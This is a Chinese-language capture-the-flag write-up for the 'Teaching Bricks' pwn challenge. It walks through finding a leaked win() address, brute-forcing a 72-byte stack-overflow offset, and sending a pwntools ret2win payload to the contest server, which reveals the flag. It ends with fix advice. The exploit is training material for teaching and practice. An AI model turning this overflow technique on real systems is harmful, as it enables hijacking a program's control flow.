# MetaCTF - Teaching Bricks Writeup

## 题目信息
- **比赛**: MetaCTF
- **题目**: Teaching Bricks
- **类别**: Pwn
- **难度**: 简单
- **附件/URL**: `nc.umbccd.net:8921`
- **附件链接**: [下载附件](https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/Teaching%20Bricks/service_info.txt){download} · [仓库位置](https://github.com/starnotes-xj/BIGC_CTF_Writeups/tree/main/CTF_Writeups/files/Teaching%20Bricks){target="_blank"}
- **Flag格式**: `DawgCTF{...}`
- **状态**: 已解

## Flag

```text
DawgCTF{$taching_br1cks}
```

## 解题过程

### 1. 初始侦察/文件识别
- 题面说明该服务在首次连接时不会主动输出，因此不能像常规菜单题那样先等 banner，必须先自行发送输入。
- 使用 `nc` 发送一个最小测试输入 `A` 后，服务立刻返回两行：

```text
win() is at: 0x4011a6
Better luck next time!
```

- 这已经非常明显地指向了一个典型的 `ret2win` 思路：
  - 程序内部存在一个可以直接拿 flag 的 `win()` 函数
  - 服务把 `win()` 地址直接泄露给了选手
  - 只要能覆盖返回地址，就可以把控制流劫持到 `win()`

### 2. 关键突破点一
- 由于泄露出来的 `win()` 地址是固定的 `0x4011a6`，可以合理推断目标不是 PIE，或者至少这道题的远端实例中该地址可直接使用。
- 因此本题不需要复杂的信息泄露链，不需要 libc，不需要 ROP 链，只需要确定**栈溢出覆盖返回地址的偏移**。
- 这里最省事的方法不是盲猜源码，而是直接写一个小脚本对常见 64 位偏移做枚举：
  - 每次连接远端
  - 发送 `b"A" * offset + p64(0x4011a6)`
  - 检查响应是否从 `Better luck next time!` 变成 flag

### 3. 关键突破点二
- 使用 pwntools 脚本从偏移 `8` 一直枚举到 `200`，大部分偏移都会返回原始失败信息。
- 当偏移来到 `72` 时，远端返回：

```text
DawgCTF{$taching_br1cks}
```

- 这说明正确的 saved RIP 覆盖偏移是 `72` 字节。
- 最终 payload 非常直接：

```python
b"A" * 72 + p64(0x4011a6)
```

- 这个 payload 的含义是：
  - 前 `72` 字节填满栈缓冲区和中间栈布局
  - 之后的 8 字节覆盖返回地址
  - 程序 `ret` 时直接跳转到 `win()`

### 4. 获取 Flag
- 使用最终利用脚本连接远端并发送：

```python
from pwn import *

io = remote("nc.umbccd.net", 8921)
io.sendline(b"A" * 72 + p64(0x4011a6))
print(io.recvall().decode())
```

- 远端返回 flag：

```text
DawgCTF{$taching_br1cks}
```

## 攻击链/解题流程总结

```text
连接远端但不等输出 → 先发送单字节测试输入 → 观察到 win() 地址泄露 → 判断为 ret2win → 枚举溢出偏移 → 发现 72 字节可覆盖 RIP → 发送 "A"*72 + p64(win) → 程序跳转到 win() 输出 Flag
```

## 漏洞分析 / 机制分析

### 根因
- 程序把用户可控输入写入了固定长度的栈缓冲区，但没有正确限制输入长度，导致返回地址可被覆盖。
- 程序还主动泄露了 `win()` 的绝对地址，进一步降低了利用门槛。
- 在这种组合下，攻击者甚至不需要构造复杂 ROP，只要找到偏移就能直接拿到 flag。

### 影响
- 攻击者可以劫持控制流，让函数返回到任意可执行地址。
- 在本题中，这个“任意地址”被简化成了直接返回到 `win()`，因此影响是**直接获得 flag**。
- 在真实程序中，同类漏洞通常可进一步扩展为任意代码执行。

### 修复建议（适用于漏洞类题目）
- 对所有栈上缓冲区输入使用带长度限制的安全接口，避免越界写入。
- 不要向用户泄露内部函数地址，尤其是在可执行文件未启用 PIE 的情况下。
- 启用编译期与运行期保护：
  - 栈 canary
  - PIE / ASLR
  - Fortify
  - 更严格的输入校验

## 知识点
- 栈溢出基础
- Ret2win 利用
- 非 PIE 场景下的固定地址跳转

## 使用的工具
- Netcat — 与远端服务做最小交互，验证题目首次连接无输出且会泄露 `win()` 地址
- Pwntools — 批量枚举偏移并构造最终 ret2win payload

## 脚本归档

- Python：[`MetaCTF_Teaching_Bricks.py` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/MetaCTF_Teaching_Bricks.py){target="_blank"}
- 说明：脚本支持直接利用，也可以枚举偏移确认 `72` 字节这一关键参数

## 命令行提取关键数据（无 GUI）

```bash
# 先用 netcat 观察最小输入时的返回内容
python -c "import socket; s=socket.create_connection(('nc.umbccd.net',8921)); s.sendall(b'A\n'); print(s.recv(4096).decode(errors='ignore'))"

# 直接利用拿 flag
python CTF_Writeups/scripts_python/MetaCTF_Teaching_Bricks.py
```

## 推荐工具与优化解题流程

> 这类题是非常标准的入门 Pwn 服务题，关键不是炫技，而是快速识别“地址已给出，只缺偏移”。

### 工具对比总结

| 工具 | 适用阶段 | 本题耗时 | 优点 | 缺点 |
|------|----------|----------|------|------|
| Netcat | 初始探测 | 秒级 | 轻量，能快速看服务响应 | 不适合做批量枚举 |
| Pwntools | 偏移枚举 + 最终利用 | 分钟级 | 构造 payload、自动化连接都很方便 | 需要本地有 Python 环境 |
| GDB / cyclic | 本地调试 | 本题未使用 | 理论上最标准 | 需要题目二进制或本地复现环境 |

### 推荐流程

**推荐流程**：先用 netcat 发送最小输入确认行为 → 识别 `win()` 泄露并判断为 ret2win → 用 pwntools 批量枚举偏移 → 固定 `offset=72` 后发送最终 payload → 拿到 Flag。

### 工具 A（推荐首选）
- **安装**：`pip install pwntools`
- **详细步骤**：
  1. 写一个最小脚本循环尝试不同偏移
  2. 每次发送 `b"A" * offset + p64(win_addr)`
  3. 根据返回结果筛选出正确偏移
- **优势**：能把“猜偏移”这一步彻底自动化

### 工具 B（可选）
- **安装**：本地 `nc` 或系统自带 socket 工具
- **详细步骤**：
  1. 先手发一行任意输入
  2. 观察是否有函数地址、菜单或错误信息泄露
  3. 再决定是否上 pwntools
- **优势**：探测成本极低，适合快速定性题型
